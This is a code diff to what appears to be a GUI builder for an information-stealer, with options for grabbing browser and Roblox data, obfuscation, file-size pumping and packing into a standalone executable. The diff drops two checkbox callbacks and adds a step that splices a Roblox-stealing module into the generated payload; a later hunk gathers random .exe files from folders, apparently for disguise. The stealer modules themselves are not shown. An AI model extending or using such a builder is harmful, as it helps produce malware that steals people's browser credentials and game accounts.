@@ -179,11 +179,11 @@ class App(ctk.CTk):
 
         self.browser = ctk.CTkCheckBox(
             self.builder_frame, text="Browser Info", font=ctk.CTkFont(size=17, family=self.font),
-            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_browser)
+            fg_color="#5d11c3", hover_color="#5057eb")
         self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=195)
 
         self.roblox = ctk.CTkCheckBox(self.builder_frame, text="Roblox Info", font=ctk.CTkFont(size=17, family=self.font),
-                                                fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
+                                                fg_color="#5d11c3", hover_color="#5057eb")
         self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)
 
         self.obfuscation = ctk.CTkCheckBox(
@@ -359,14 +359,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
         self.mb = self.pump_size.get()
         byte_size = int(self.mb.replace("mb", ""))
         return byte_size
-
-    def check_roblox(self):
-        if self.roblox.get() == 1:
-            self.browser.select()
-            
-    def check_browser(self):
-        if self.browser.get() == 0:
-            self.roblox.deselect()
 
     def check_obfuscation(self):
         if self.obfuscation.get() == 1:
@@ -604,6 +596,11 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
                 if self.updated_dictionary["games"]:
                     with open(options+"Games.py", "r", encoding="utf-8") as f:
+                        code += f.read()
+                        code += "\n\n"
+
+                if self.updated_dictionary["roblox"]:
+                    with open(options+"Roblox.py", "r", encoding="utf-8") as f:
                         code += f.read()
                         code += "\n\n"
 
@@ -973,7 +970,7 @@ class %s:
         for path in paths:
             if os.path.isdir(path):
                 exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and x not in exeFiles)]
-    
+                
         if exeFiles:
             while(retries < 5):
                 exefile = random.choice(exeFiles)
